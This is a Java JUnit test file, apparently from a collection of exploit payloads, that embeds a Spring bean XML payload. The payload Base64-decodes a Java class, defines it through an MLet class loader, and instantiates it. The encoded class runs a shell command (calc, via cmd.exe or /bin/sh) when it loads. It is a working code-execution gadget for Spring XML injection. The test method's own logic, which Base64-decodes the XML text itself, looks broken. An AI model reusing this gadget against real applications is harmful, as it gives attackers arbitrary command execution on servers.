package com.hzk.safe.payload.other.spring;

import org.junit.Test;
import org.springframework.util.Base64Utils;

public class SpringBeanXmlTest {

    @Test
    public void springBeanXmlClassLoader() throws Exception {
        String str = "<beans\n" +
                "    xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n" +
                "                           http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"decoder\" class=\"org.springframework.beans.factory.config.MethodInvokingFactoryBean\">\n" +
                "        <property name=\"staticMethod\" value=\"org.springframework.util.Base64Utils.decodeFromString\"/>\n" +
                "        <property name=\"arguments\">\n" +
                "            <list>\n" +
                "                <value>yv66vgAAADIAQAEAWG9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL3Nlci9CZWFuU2VyaWFsaXplck1vZGlmaWVyYmFlNmRhMzM2NjFiNDZjNDg1MDQzYTA0OTExNDcwNmYHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAIPGNsaW5pdD4BAARjYWxjCAA7CgACAA0BAARDb2RlAQANU3RhY2tNYXBUYWJsZQAhAAIABAAAAAMACQAFAAYAAAAJAAcABgAAAAkACAAGAAAAAgABAAkACgABAD4AAACEAAQAAgAAAFMqtwAOEhC4ABa2ABwSHrYAIpkAEBIkswAmEiizACqnAA0SLLMAJhIuswAqBr0AGFkDsgAmU1kEsgAqU1kFsgAwU0y7ADJZK7cANbYAOVenAARMsQABAAQATgBRAAwAAQA/AAAAFwAE/wAhAAEHAAIAAAllBwAM/AAABwAEAAgAOgAKAAEAPgAAABoAAgAAAAAADhI8swAwuwACWbcAPVexAAAAAAAA</value>\n" +
                "            </list>\n" +
                "        </property>\n" +
                "    </bean>\n" +
                "    <bean id=\"classLoader\" class=\"javax.management.loading.MLet\"/>\n" +
                "    <bean id=\"clazz\" factory-bean=\"classLoader\" factory-method=\"defineClass\">\n" +
                "        <constructor-arg ref=\"decoder\"/>\n" +
                "        <constructor-arg type=\"int\" value=\"0\"/>\n" +
                "        <constructor-arg type=\"int\" value=\"897\"/>\n" +
                "    </bean>\n" +
                "    <bean factory-bean=\"clazz\" factory-method=\"newInstance\"/>\n" +
                "</beans>";
        byte[] bytes = Base64Utils.decodeFromString(str);
        System.out.println(bytes);
    }

}
